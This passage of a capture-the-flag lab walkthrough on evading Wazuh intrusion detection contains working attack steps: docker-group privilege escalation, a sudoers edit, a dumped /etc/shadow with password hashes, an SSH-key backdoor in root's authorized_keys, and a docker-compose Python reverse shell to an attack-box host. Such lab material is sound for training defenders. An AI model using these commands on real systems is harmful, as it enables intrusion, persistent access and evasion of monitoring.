+/usr/lib/grub/i386-pc/password_pbkdf2.mod
+/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
+/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-38.pyc
+/usr/lib/python3/dist-packages/keyring/credentials.py
+/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-38.pyc
+/usr/lib/python3/dist-packages/launchpadlib/credentials.py
+/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-38.pyc
+/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-38.pyc
+/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-38.pyc
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-38.pyc
+/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
+/usr/lib/python3/dist-packages/twisted/cred/credentials.py
+/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-38.pyc
+/usr/lib/systemd/systemd-reply-password
+/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
+/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
+/usr/lib/systemd/system/systemd-ask-password-console.path
+/usr/lib/systemd/system/systemd-ask-password-console.service
+/usr/lib/systemd/system/systemd-ask-password-plymouth.path
+
+╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
+
+╔══════════╣ Searching passwords inside logs (limit 70)
+[   11.109149] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+[   19.687272] systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+ configure base-passwd:amd64 3.5.47 3.5.47
+ install base-passwd:amd64 <none> 3.5.47
+ status half-configured base-passwd:amd64 3.5.47
+ status half-installed base-passwd:amd64 3.5.47
+ status installed base-passwd:amd64 3.5.47
+ status unpacked base-passwd:amd64 3.5.47
+ status half-configured base-passwd:amd64 3.5.47
+ status half-installed base-passwd:amd64 3.5.47
+ status unpacked base-passwd:amd64 3.5.47
+ upgrade base-passwd:amd64 3.5.47 3.5.47
+ install passwd:amd64 <none> 1:4.8.1-1ubuntu5
+ status half-installed passwd:amd64 1:4.8.1-1ubuntu5
+ status unpacked passwd:amd64 1:4.8.1-1ubuntu5
+ configure base-passwd:amd64 3.5.47 <none>
+ status half-configured base-passwd:amd64 3.5.47
+ status installed base-passwd:amd64 3.5.47
+ status unpacked base-passwd:amd64 3.5.47
+ configure passwd:amd64 1:4.8.1-1ubuntu5 <none>
+ status half-configured passwd:amd64 1:4.8.1-1ubuntu5
+ status installed passwd:amd64 1:4.8.1-1ubuntu5
+ status unpacked passwd:amd64 1:4.8.1-1ubuntu5
+ status half-configured passwd:amd64 1:4.8.1-1ubuntu5
+ status half-installed passwd:amd64 1:4.8.1-1ubuntu5
+ status unpacked passwd:amd64 1:4.8.1-1ubuntu5
+ upgrade passwd:amd64 1:4.8.1-1ubuntu5 1:4.8.1-1ubuntu5.20.04.1
+ configure passwd:amd64 1:4.8.1-1ubuntu5.20.04.1 <none>
+ status half-configured passwd:amd64 1:4.8.1-1ubuntu5.20.04.1
+ status installed passwd:amd64 1:4.8.1-1ubuntu5.20.04.1
+ status unpacked passwd:amd64 1:4.8.1-1ubuntu5.20.04.1
+,299 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords - wb: [644] 24 bytes
+,300 - ssh_util.py[DEBUG]: line 124: option PasswordAuthentication added with no
+,332 - cc_set_passwords.py[DEBUG]: Restarted the SSH daemon.
+,332 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
+,016 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,016 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,963 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,963 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,889 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,889 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+,514 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
+,514 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+ base-passwd depends on libc6 (>= 2.8); however:
+ base-passwd depends on libdebconfclient0 (>= 0.145); however:
+Binary file /var/log/journal/57cbfb2b1cf2404f9c0a757dbb01eaa1/user-1001.journal matches
+dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
+Preparing to unpack .../base-passwd_3.5.47_amd64.deb ...
+Preparing to unpack .../passwd_1%3a4.8.1-1ubuntu5_amd64.deb ...
+Selecting previously unselected package base-passwd.
+Selecting previously unselected package passwd.
+Setting up base-passwd (3.5.47) ...
+Setting up passwd (1:4.8.1-1ubuntu5) ...
+Shadow passwords are now on.
+Unpacking base-passwd (3.5.47) ...
+Unpacking base-passwd (3.5.47) over (3.5.47) ...
+Unpacking passwd (1:4.8.1-1ubuntu5) ...
+
+                                ╔════════════════╗
+════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
+                                ╚════════════════╝
+Regexes to search for API keys aren't activated, use param '-r' 
+
+Alert Details
+
+    Alert ID: 66221
+    Alert Timestamp: .639000
+    Source IP: 10.8.19.103
+    Affected Asset: apachesite
+    Alert Description: Web server 400 error code.
+    Alert Category: web
+    Alert Severity: 5
+    Alert Score: 2.67
+```
+What tool does linPEAS detect as having a potential escalation vector?
+You might want to pipe the result in to less so it's easier to read. Highly promising escalation vectors are highlighted with red and yellow
+*docker*
+Is an alert triggered by Wazuh when linPEAS is added to the system, if so what its severity?
+For this demo, Wazuh scans the file system every 60 seconds, so you might need to wait for a bit. Note, that by default it's 12 hours.
+*5*
+The last task allowed us to identify Docker as a potential privilege escalation vector. Now it's time to perform the escalation itself. First, though, I should explain how this particular privilege escalation works. In short, this attack leverages a commonly suggested [workaround](https://stackoverflow.com/questions/48568172/docker-sock-permission-denied) that allows non-root users to run docker containers. The workaround requires adding a non-privileged user to the `docker`group which, allows that user to run containers without using `sudo` or having root privileges. However, this also grants effective root-level privileges to the provided user, as they are able to spawn containers without restriction.
+We can use these capabilities to gain root privileges quite easily try and run the following with the `grafana-admin` account:
+`docker run -it --entrypoint=/bin/bash -v /:/mnt/ ghcr.io/jroo1053/ctfscoreapache:master`
+This will spawn a container in interactive mode, overwrite the default entry-point to give us a shell, and mount the hosts file system to root.  From within this container, we can then edit one of the following files to gain elevated privileges:
+-   `/etc/group` We could add the`grafana-admin` account to the root group. Note, that this file is covered by the HIDS
+-   `/etc/sudoers` Editing this file would allow us to add the grafana-admin account to the sudoers list and thus, we would be able to run `sudo` to gain extra privileges. Again, this file is monitored by Wazuh.  In this case, we can perform this by running:
+`echo "grafana-admin ALL=(ALL) NOPASSWD: ALL" >>/mnt/etc/sudoers   `
+-   We could add a new user to the system and join the root group via `/etc/passwd`. Again though, this activity is likely to be noticed by the HIDS
+Try a few of these options and note the resultant IDS alerts.
+Answer the questions below
+```text
+grafana-admin@reversegear:/tmp$ docker images
+REPOSITORY                         TAG       IMAGE ID       CREATED         SIZE
+ghcr.io/jroo1053/ctfscoregrafana   master    e848783e769c   10 months ago   1.32GB
+ghcr.io/jroo1053/ctfscore          master    7d49331dd6ec   10 months ago   1.34GB
+ghcr.io/jroo1053/ctfscorelog       master    a64d9def22e0   10 months ago   1.42GB
+ghcr.io/jroo1053/ctfscoreapache    master    769b3f1c8b49   10 months ago   1.11GB
+ghcr.io/jroo1053/ctfscoregrafana   <none>    407bef32f02c   10 months ago   1.34GB
+jasonish/suricata                  latest    27e5c6b8072a   12 months ago   640MB
+wazuh/wazuh-odfe                   4.2.5     ec792e3279fe   15 months ago   965MB
+
+grafana-admin@reversegear:/tmp$ docker run -it --entrypoint=/bin/bash -v /:/mnt/ ghcr.io/jroo1053/ctfscoreapache:master
+root@9b015b2798a4:/# cd /root
+root@9b015b2798a4:~# ls
+root@9b015b2798a4:~# cd /mnt/root
+root@9b015b2798a4:/mnt/root# ls
+root.txt  snap
+root@9b015b2798a4:/mnt/root# cat root.txt
+{SNEAK_ATTACK_CRITICAL}
+
+root@9b015b2798a4:/mnt/root# echo "grafana-admin ALL=(ALL) NOPASSWD: ALL" >>/mnt/etc/sudoers
+root@9b015b2798a4:/mnt/root# exit
+exit
+grafana-admin@reversegear:/tmp$ cat /etc/shadow
+cat: /etc/shadow: Permission denied
+grafana-admin@reversegear:/tmp$ sudo -s
+root@reversegear:/tmp# cat /etc/shadow
+root:*:19046:0:99999:7:::
+daemon:*:19046:0:99999:7:::
+bin:*:19046:0:99999:7:::
+sys:*:19046:0:99999:7:::
+sync:*:19046:0:99999:7:::
+games:*:19046:0:99999:7:::
+man:*:19046:0:99999:7:::
+lp:*:19046:0:99999:7:::
+mail:*:19046:0:99999:7:::
+news:*:19046:0:99999:7:::
+uucp:*:19046:0:99999:7:::
+proxy:*:19046:0:99999:7:::
+www-data:*:19046:0:99999:7:::
+backup:*:19046:0:99999:7:::
+list:*:19046:0:99999:7:::
+irc:*:19046:0:99999:7:::
+gnats:*:19046:0:99999:7:::
+nobody:*:19046:0:99999:7:::
+systemd-network:*:19046:0:99999:7:::
+systemd-resolve:*:19046:0:99999:7:::
+systemd-timesync:*:19046:0:99999:7:::
+messagebus:*:19046:0:99999:7:::
+syslog:*:19046:0:99999:7:::
+_apt:*:19046:0:99999:7:::
+tss:*:19046:0:99999:7:::
+uuidd:*:19046:0:99999:7:::
+tcpdump:*:19046:0:99999:7:::
+landscape:*:19046:0:99999:7:::
+pollinate:*:19046:0:99999:7:::
+usbmux:*:19088:0:99999:7:::
+sshd:*:19088:0:99999:7:::
+systemd-coredump:!!:19088::::::
+fred:$6$MgTQuWlOoVxEBVXy$i3T5XiFmP.OKRfNzcQJ4MqE2iREqMGZO6eq18mzOMRU9hnLEtKlb81UcfCb8QvKdn.oY4Y4qCUn3C132vDUuo/:19088:0:99999:7:::
+lxd:!:19088::::::
+grafana-admin:$6$ptoQwBy/gkonPuzy$J6G73qVfQe5ZrdC9VDc8duMl5PA0FqGX7tMEusGCt/hZRuBaMLY2qUE3AoR88KWmnE80kSj/d6I.YU/WoM0Yv0:19088:0:99999:7:::
+ossec:*:19088:0:99999:7:::
+```
+Perform the privilege escalation and grab the flag in /root/
+*{SNEAK_ATTACK_CRITICAL}*
+### Establishing Persistence
+The compromised host is running Linux so we have a number of persistence mechanisms available to us. The first option which, is arguably the most straightforward is to add a public key that we control to the authorized_keys file at `/root/.ssh/`. This would allow us to connect to the host via SSH without needing to run the privilege escalation exploit every time and without relying on the password for the compromised account not changing. This methodology is very common among botnets as it's both reliable and very simple to implement as pretty much all Linux distributions indented for server use run an Open-SSH service by default.
+Try this now, a valid key pair can be generated for the attack box by running `ssh-keygen`. Once this key is added to the authorized_keys file in `/root/.ssh/` you should be able to gain remote access to root whenever it's needed, simple right? Well, unfortunately, this tactic has one big disadvantage as it is highly detectable.
+HIDS often feature some form of file system integrity monitoring service which, will periodically scan a list of target directories for changes with, an alert being raised every time a file is changed or added. By adding an entry to the `authorized_keys` file you would have triggered an alert of a fairly high severity and as a result, this might not be the best option. An alert is also raised every time an ssh connection is made so the HIDS operator will be notified every time we log on.
+It would be very helpful to check how the IDS is configured before we continue as it may help us with finding vectors that aren't monitored. Wazuh has two configuration modes, local and centralised in this case, the HIDS agents are setup locally and the config file can be found at `/var/ossec/etc/ossec.conf`. This file lists all of the data sources that are covered by HIDS in this case, the following are enabled:
+-   **File system monitoring** - As already mentioned this affects our ability to simply install ssh keys but, this also affects other persistence vectors like, `cron`, `systemd` and any attacks that require the installation of additional tools.
+-   **System log collection** - This functionality will generate alerts when some post-exploitation actions are taken against the system like making SSH connections and login attempts.
+-   **System inventory** - This tracks system metrics like open ports, network interfaces, packages, and processes. This affects our ability to open new ports for reverse shells and install new packages. Note, that this function currently, does not generate alerts by itself and requires the HIDS operator to write their own rules. However, A report would be available on an upstream log analysis platform like Kibana
+Note, that Docker monitoring is also available, however, it is not enabled in this case which gives us a few options:
+-   We could hijack the existing container supply chain and use it to install a backdoor into one of the containers that are hosted by the system. This would be difficult to detect without additional container monitoring and scanning technology. Credentials for a docker registry could either be phished or extracted from`/root/.docker/config.json` as, this location stores the credentials used with the `docker login` command in plaintext. This won't work in this case though, as the host we compromised doesn't have internet access and there are no credentials in `/root/.docker/config.json`.
+-   We could modify the existing docker-compose setup to include a privileged SSH enabled container and mount the host's file system to it with `-v /:/hostOS`. The docker-compose file used to define the current setup isn't monitored by the file system integrity monitor as it's in `/var/lib.` Again though, this won't work well in this case as we don't have access to the internet though, you could transport the container images from the attack box to the compromised VM via SSH. You would also need to open up a new port for the ssh connection which, would show up on the system inventory report.
+-   We could modify an existing or new docker-compose setup by, abusing the `entrypoint` option to grant us a reverse shell. Using docker-compose also allows us to specify automatic restarts which increases the backdoor's resilience. This option also reverses the typical client-server connection model so, we won't need to open any new ports on the host.
+To perform the last option append the following to a new docker-compose file:
+```bash
+version: "2.1"
+
+services:
+
+backdoorservice:
+
+restart: always
+
+image: ghcr.io/jroo1053/ctfscore:master
+
+entrypoint: >  
+python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+
+s.connect(("<ATTACKBOXIP>",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
+
+pty.spawn("/bin/sh")'
+
+volumes:
+
+- /:/mnt
+
+privileged: true
+```
+This will create a new docker container using an image that's already available on the system, mount the entire host file system to `/mnt/`on the container and spawn a reverse shell with python. Listen for the reverse shell connection on the attack box with:
+`nc -lvnp 4242`
+Then start the service on the host with:
+`docker-compose up`
+Once these are performed you should have a way to access the vulnerable host without relying on SSH, a vulnerable service, or user credentials. Of course, you will still be able to use these other methods in conjunction with the docker-compose reverse shell as, backups.
+Answer the questions below
+```text
+──(witty㉿kali)-[~/bug_hunter/my_keys]
+└─$ ssh-keygen
+
+┌──(witty㉿kali)-[~/.ssh]
+└─$ cat id_rsa.pub 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDcGZZnZ/BkafcdrWpFJI2XZFGUS2+3KVC/gk253z9IDoaWRlH3sraR76XuhyRprJA3iN6GZITga5hE7MdkXaVyYWVQZNRvrLvOjfN+ig5lXTKs5dAal/GzkynkvrBFMgLHbzq4A9R2lOUe6s1RDnr9z+sZJGbl3ryuyW/lU8HAbfhWVqy/goIG+ddSpYraxm4Od/tlqpPesJjyFvqksp3mSTqy2740cbjkIEGsTrm0fnrZIrq8YfAi2juhoFf4vgX5APp0GbrczuErKxJjy9AmTupaFxJTi655Z3Y2zPuOnJitUunvzQEUxs1kMkIS0J+qT927KOMweiD7d1e3j64lfNQFJRHYxc0h8+h17rxqLu4SZCX64o75RInQaDP/9G4tn2hR+PGWYC3bOqDzygLgIiBMECBfYAqAqo4tz05BAc2ZAKjZ4278jLFwNJcxzTNjH358jj3xtoBtUR+x6PhXQf5ATG5siWuZn44vi+M6ZQcIOMDIqqXZ4qaO+4/ElEc= witty@kali
+
+root@reversegear:/tmp# cd /root/.ssh/
+root@reversegear:~/.ssh# ls
+authorized_keys
+root@reversegear:~/.ssh# cat authorized_keys 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDV04oSSRPNKmEFP1orsFNp1UrO4yePKrfZVJThrw/z8X0s40tdcWTASowJUdOC9rEAN2xqng+utR6JJ1SviX8+vwxItFnaibuygKrfIF2wav2osGkPBJRwDozejQVpbRaP+ZdSB21Q4zl/4eaOgYyT/sSGRWPO1ilomG6WmQ5egoqUXBacSNwcpe9ESqdG/7+8pnM778LhXk1nbDFWi4eaoZfCc19WmQtGqxZCjqQI//rzFrgw3DonhRztASAaDihWFCYC7q3FDPRD3NwAYPMeKo/G8du16RF7J49eHH80tvH7gidHdih0vtsme13SGTOt3lnK1pxs9fM/zBxzVIBiLzH+ydxOeTFLN01PfzjXcNPT2TEWC/ctplrB1WHWeIun1xD22URhZMvIhIwuIA66mao45nXMgCUTkVRBus5S+Psl4jwKlmu9SZwvyc1/L2S03aJRkrKW0P26N4+aw6qs2VaPKS3qddPVnrwBQwby3D1wvDAmRFT0/TVIGHGgqg8=
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC0DG1DGv6Yr8Ns7QIS8rZ5eDYTYY5auNryfRMitG0rqwDED2pHVntW7V41kqIa8pclsnfMmw2SRvRYUEFxfTo15M/QRXFEfgYsfka55F/IV7JiIwivTPDCb0r/QlgGa1V0Hbp4PKBFv8J7VACPwiG2oJZi6MRGuBQ12k/WP8o2xGvGiR6EPWfe4JVjVfB9zEJjYGx6XoZvoYiykQ89ZAYx/jJSuSuITLjpFwxlkI7acSVr0QZTeHc4AuSQts01mj6woacY94406Cc0ZfyZcfB50PbzKabPrrY0A1cMrT2QjSEaWfKBgpqM0YhRFU2wduv06amZwzsVaoMsxkBJkh0G4mQSxNU4SPfClGeqPlz6DlgBfcx5DXIKLbY5ss424/9QyeP19+DFDLJZGRIDVtG8Rjc2yeVCQ7TfmrRBpLJ1I3EE01fAm93rShL2qrnymVs+tbuL+uDNH9VTbXMgpC2Zws7vhO7sKKF19B9HUvBgSvzYVo0RgNc9RZ5rSjRblvk=
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCxRVMNoPOMmKUa7Lci3T7sKu+Nn0WFQs8cgDFrfEvU9FsBQmEORcvoQQz14XKHkYLgU1OmealXV/ON4k46UzwGbsEDfsF8Pvchi4vtjLgq8ffueJxT1/gURPIQ943f0U91m3i4eTCK++QC+65G73PCxfgV1xpzgqZHGIb1faQd0+0kkF7WAtuGjkHmy9PUCYEIKAsTn5Kh1wOXxif+hyTy2tE2ngOi2j9IRlIwMO6kgDR//ZNNKKBTOSXJ/6Tz7Ec+G01DXNmmbCbrXzj56417a3bWGJ38RvEqerq1QGWRuXb9KdYqdbZWH7/S7GO1w18xauPfpAfF/tQ0WuVhmMd/BybwSMb9ez9+Z/lJOh2hL9DWdJKJ6tlRihfHb98edrGSxfCvEpjvgiOM01TW4RH2eHD+38nyEqXcQNhYT1Kh7ifwaQa02E63Ab+7+TvjU4CDAMLgGO1n3J5b2KAbUYkAPCk1tvkCYw0fX2eA+9GL1VS3Whkxa8TjbPBskuNepoc=
+
+now uploading my pub key
+
+root@reversegear:~/.ssh# echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDcGZZnZ/BkafcdrWpFJI2XZFGUS2+3KVC/gk253z9IDoaWRlH3sraR76XuhyRprJA3iN6GZITga5hE7MdkXaVyYWVQZNRvrLvOjfN+ig5lXTKs5dAal/GzkynkvrBFMgLHbzq4A9R2lOUe6s1RDnr9z+sZJGbl3ryuyW/lU8HAbfhWVqy/goIG+ddSpYraxm4Od/tlqpPesJjyFvqksp3mSTqy2740cbjkIEGsTrm0fnrZIrq8YfAi2juhoFf4vgX5APp0GbrczuErKxJjy9AmTupaFxJTi655Z3Y2zPuOnJitUunvzQEUxs1kMkIS0J+qT927KOMweiD7d1e3j64lfNQFJRHYxc0h8+h17rxqLu4SZCX64o75RInQaDP/9G4tn2hR+PGWYC3bOqDzygLgIiBMECBfYAqAqo4tz05BAc2ZAKjZ4278jLFwNJcxzTNjH358jj3xtoBtUR+x6PhXQf5ATG5siWuZn44vi+M6ZQcIOMDIqqXZ4qaO+4/ElEc= witty@kali" >> authorized_keys
+
+┌──(witty㉿kali)-[~/.ssh]
+└─$ ssh root@10.10.3.55
+
+##################################        Reverse Gear Racing LTD.          ############################################################
+ALERT! You are entering into a secured area! Your IP, Login Time, Username has been noted and has been sent to the server administrator!
+This service is restricted to authorized users only. All activities on this system are logged.
+Unauthorized access will be fully investigated and reported to the appropriate law enforcement agencies.
+
+Enter passphrase for key '/home/witty/.ssh/id_rsa': 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-107-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu 16 Feb 00:54:17 UTC 2023
+
+  System load:  0.06               Users logged in:          1
+  Usage of /:   73.9% of 18.82GB   IPv4 address for ctf:     172.200.0.1
+  Memory usage: 55%                IPv4 address for docker0: 172.17.0.1
+  Swap usage:   0%                 IPv4 address for eth0:    10.10.3.55
+  Processes:    200
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+23 updates can be applied immediately.
+To see these additional updates run: apt list --upgradable
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Wed Apr  6 09:11:12 2022 from 192.168.56.1
+root@reversegear:~# whoami
+root
+root@reversegear:~# :)
+
+Detected by Wazuh
+
+Alert Details
+
+    Alert ID: 70147
+    Alert Timestamp: .677000
+    Source IP: 10.8.19.103
+    Affected Asset: dockerhost
+    Alert Description: sshd: authentication success.
+    Alert Category: syslog
+    Alert Severity: 3
+    Alert Score: 3.2
+
+root@reversegear:~/.ssh# cat /var/ossec/etc/ossec.conf
+<!--
+  Wazuh - Agent - Default configuration for ubuntu 18.04
+  More info at: https://documentation.wazuh.com
+  Mailing list: https://groups.google.com/forum/#!forum/wazuh
+-->
+
+<ossec_config>
+<client>
+    <server>
+    <address>172.200.0.50</address>
+    <port>1514</port>
+    <protocol>tcp</protocol>
+    </server>
+    <config-profile>ubuntu, ubuntu18, ubuntu18.04</config-profile>
+    <notify_time>10</notify_time>
+    <time-reconnect>60</time-reconnect>
+    <auto_restart>yes</auto_restart>
+    <crypto_method>aes</crypto_method>
+    <enrollment>
+    <agent_name>dockerhost</agent_name>
+    </enrollment>
+</client>
+
+  <client_buffer>
+    <!-- Agent buffer options -->
+    <disabled>no</disabled>
+    <queue_size>25000</queue_size>
+    <events_per_second>1000</events_per_second>
+  </client_buffer>
+
+  <!-- Policy monitoring -->
+  <rootcheck>
+    <disabled>no</disabled>
+    <check_files>yes</check_files>
+    <check_trojans>yes</check_trojans>
+    <check_dev>yes</check_dev>
+    <check_sys>yes</check_sys>
+    <check_pids>yes</check_pids>
+    <check_ports>yes</check_ports>
+    <check_if>yes</check_if>
+
+    <!-- Frequency that rootcheck is executed - every 12 hours -->
+    <frequency>43200</frequency>
+
+    <rootkit_files>etc/shared/rootkit_files.txt</rootkit_files>
+    <rootkit_trojans>etc/shared/rootkit_trojans.txt</rootkit_trojans>
+
+    <skip_nfs>yes</skip_nfs>
+  </rootcheck>
+
+  <wodle name="cis-cat">
+    <disabled>yes</disabled>
+    <timeout>1800</timeout>
+    <interval>1d</interval>
+    <scan-on-start>yes</scan-on-start>
+
+    <java_path>wodles/java</java_path>
+    <ciscat_path>wodles/ciscat</ciscat_path>
+  </wodle>
+
+  <!-- Osquery integration -->
+  <wodle name="osquery">
+    <disabled>yes</disabled>
+    <run_daemon>yes</run_daemon>
+    <log_path>/var/log/osquery/osqueryd.results.log</log_path>
+    <config_path>/etc/osquery/osquery.conf</config_path>
+    <add_labels>yes</add_labels>
+  </wodle>
+
+  <!-- System inventory -->
+  <wodle name="syscollector">
+    <disabled>no</disabled>
+    <interval>1h</interval>
+    <scan_on_start>yes</scan_on_start>
+    <hardware>yes</hardware>
+    <os>yes</os>
+    <network>yes</network>
+    <packages>yes</packages>
+    <ports all="no">yes</ports>
+    <processes>yes</processes>
+
+    <!-- Database synchronization settings -->
+    <synchronization>
+      <max_eps>10</max_eps>
+    </synchronization>
+  </wodle>
+
+  <sca>
+    <enabled>yes</enabled>
+    <scan_on_start>yes</scan_on_start>
+    <interval>12h</interval>
+    <skip_nfs>yes</skip_nfs>
+  </sca>
+
+  <!-- File integrity monitoring -->
+  <syscheck>
+    <disabled>no</disabled>
+
+    <!-- Frequency that syscheck is executed default every 12 hours -->
+    <frequency>60</frequency>
+
+    <scan_on_start>yes</scan_on_start>
+
+    <!-- Directories to check  (perform all possible verifications) -->
+    <directories>/etc,/usr/bin,/usr/sbin</directories>
+    <directories>/bin,/sbin,/boot</directories>
+    <directories>/root/</directories>
+    <directories>/home/fred/,/home/grafana-admin</directories>
+    <!-- Files/directories to ignore -->
+    <ignore>/etc/mtab</ignore>
+    <ignore>/etc/hosts.deny</ignore>
+    <ignore>/etc/mail/statistics</ignore>
+    <ignore>/etc/random-seed</ignore>
+    <ignore>/etc/random.seed</ignore>
+    <ignore>/etc/adjtime</ignore>
+    <ignore>/etc/httpd/logs</ignore>
+    <ignore>/etc/utmpx</ignore>
+    <ignore>/etc/wtmpx</ignore>
+    <ignore>/etc/cups/certs</ignore>
+    <ignore>/etc/dumpdates</ignore>
+    <ignore>/etc/svc/volatile</ignore>
+
+    <!-- File types to ignore -->
+    <ignore type="sregex">.log$|.swp$</ignore>
+
+    <!-- Check the file, but never compute the diff -->
+    <nodiff>/etc/ssl/private.key</nodiff>
+
+    <skip_nfs>yes</skip_nfs>
+    <skip_dev>yes</skip_dev>
+    <skip_proc>yes</skip_proc>
+    <skip_sys>yes</skip_sys>
+
+    <!-- Nice value for Syscheck process -->
+    <process_priority>10</process_priority>
+
+    <!-- Maximum output throughput -->
+    <max_eps>100</max_eps>
+
+    <!-- Database synchronization settings -->
+    <synchronization>
+      <enabled>yes</enabled>
+      <interval>5m</interval>
+      <max_interval>1h</max_interval>
+      <max_eps>10</max_eps>
+    </synchronization>
+  </syscheck>
+
+  <!-- Log analysis -->
+  <localfile>
+    <log_format>command</log_format>
+    <command>df -P</command>
+    <frequency>360</frequency>
+  </localfile>
+
+  <localfile>
+    <log_format>full_command</log_format>
+    <command>netstat -tulpn | sed 's/\([[:alnum:]]\+\)\ \+[[:digit:]]\+\ \+[[:digit:]]\+\ \+\(.*\):\([[:digit:]]*\)\ \+\([0-9\.\:\*]\+\).\+\ \([[:digit:]]*\/[[:alnum:]\-]*\).*/\1 \2 == \3 == \4 \5/' | sort -k 4 -g | sed 's/ == \(.*\) ==/:\1/' | sed 1,2d</command>
+    <alias>netstat listening ports</alias>
+    <frequency>360</frequency>
+  </localfile>
+
+  <localfile>
+    <log_format>full_command</log_format>
+    <command>last -n 20</command>
+    <frequency>360</frequency>
+  </localfile>
+
+  <!-- Active response -->
+  <active-response>
+    <disabled>no</disabled>
+    <ca_store>etc/wpk_root.pem</ca_store>
+    <ca_verification>yes</ca_verification>
+  </active-response>
+
+  <!-- Choose between "plain", "json", or "plain,json" for the format of internal logs -->
+  <logging>
+    <log_format>plain</log_format>
+  </logging>
+
+</ossec_config>
+
+<ossec_config>
+  <localfile>
+    <log_format>syslog</log_format>
+    <location>/var/ossec/logs/active-responses.log</location>
+  </localfile>
+
+  <localfile>
+    <log_format>syslog</log_format>
+    <location>/var/log/auth.log</location>
+  </localfile>
+
+  <localfile>
+    <log_format>syslog</log_format>
+    <location>/var/log/syslog</location>
+  </localfile>
+
+  <localfile>
+    <log_format>syslog</log_format>
+    <location>/var/log/dpkg.log</location>
+  </localfile>
+
+  <localfile>
+    <log_format>syslog</log_format>
+    <location>/var/log/kern.log</location>
+  </localfile>
+  <localfile>
+    <log_format>apache</log_format>
+    <location>/var/log/apache2/error.log</location>
+  </localfile>
+
+  <localfile>
+    <log_format>apache</log_format>
+    <location>/var/log/apache2/access.log</location>
+  </localfile>
+</ossec_config>
+
+root@reversegear:~/.ssh# cd /root
+root@reversegear:~# ls -lah
+total 48K
+drwx------  8 root root 4.0K Apr  6  2022 .
+drwxr-xr-x 19 root root 4.0K Apr  6  2022 ..
+drwx------  3 root root 4.0K Apr  6  2022 .ansible
+-rw-------  1 root root    0 Apr  6  2022 .bash_history
+-rw-r--r--  1 root root 3.1K Dec  5  2019 .bashrc
+drwx------  2 root root 4.0K Apr  6  2022 .cache
+drwx------  2 root root 4.0K Apr  6  2022 .docker
+drwxr-xr-x  3 root root 4.0K Apr  6  2022 .local
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+-rw-r--r--  1 root root   23 Apr  6  2022 root.txt
+drwx------  3 root root 4.0K Apr  6  2022 snap
+drwx------  2 root root 4.0K Apr  6  2022 .ssh
+-rw-r--r--  1 root root  165 Apr  6  2022 .wget-hsts
+root@reversegear:~# cd .docker
+root@reversegear:~/.docker# ls
+config.json
+root@reversegear:~/.docker# cat config.json
+
+root@reversegear:~# find / -type f -name docker-compose.yml 2>/dev/null
+/var/lib/ctf/docker-compose.yml
+
+root@reversegear:~# cd /var/lib/ctf/
+root@reversegear:/var/lib/ctf# ls
+docker-compose.yml  dockerctf
+root@reversegear:/var/lib/ctf# cat docker
+docker-compose.yml  dockerctf/          
+root@reversegear:/var/lib/ctf# cat docker-compose.yml 
+---
+version: '2.1'
+networks:
+  ctf:
+    driver: bridge
+    driver_opts:
+      com.docker.network.bridge.name: ctf
+    ipam:
+      config:
+        - subnet: "172.200.0.0/24"
+          gateway: "172.200.0.1"
+services:
+  ctflog:
+    restart: always
+    image: ghcr.io/jroo1053/ctfscorelog:master
+    container_name: ctflog
+    volumes:
+      - ./dockerctf/logs/suricata/:/var/log/suricata
+      - ./dockerctf/confs/ctfscorelog/:/etc/ctfscorelog/
+      - ./dockerctf/logs/:/var/log/ctfscorelog/
